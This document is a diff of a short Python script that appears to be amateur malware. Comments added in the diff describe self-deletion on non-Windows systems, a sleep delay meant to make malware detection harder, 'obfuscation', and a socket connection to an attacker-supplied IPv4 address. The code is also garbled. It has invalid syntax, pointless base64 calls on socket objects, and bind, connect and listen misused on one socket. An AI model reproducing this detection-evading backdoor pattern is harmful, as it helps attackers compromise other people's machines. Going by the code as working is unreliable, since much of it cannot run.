@@ -3,14 +3,17 @@ import base64
 import os
 import time
 
+#checking if it's running on windows else it will delete itself
 if os.name == 'nt':
     print("keep going")
 else:
  del lsadd.py
 
-balls = 600
+#this is used to make Malware detection harder to detect this although you will have to wait 5 minutes it's optional
+balls = 500
 time.sleep(balls)
 
+#obfuscation
 base64.standard_b64encode(socket)
 base64.standard_b64encode(socket.SOCK_STREAM)
 base64.standard_b64encode(socket.gethostname)
@@ -22,12 +25,12 @@ base64.standard_b64encode(socket.send)
 base64.standard_b64encode(base64.standard_b64encode)
 base64.standard_b64encode(socket.accept)
 
-
+#reverse enginnering
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, protocol=0)
 host = socket.gethostname()
 port = 21
 server = 'your ipv4'
-addr = socket.bind(server, port)
+addr = socket.bind(server, port) #put your ipv4 here change AF_INET to AF_INET6 if you have ipv6
 socket.connect(addr)
 
 socket.listen(1)
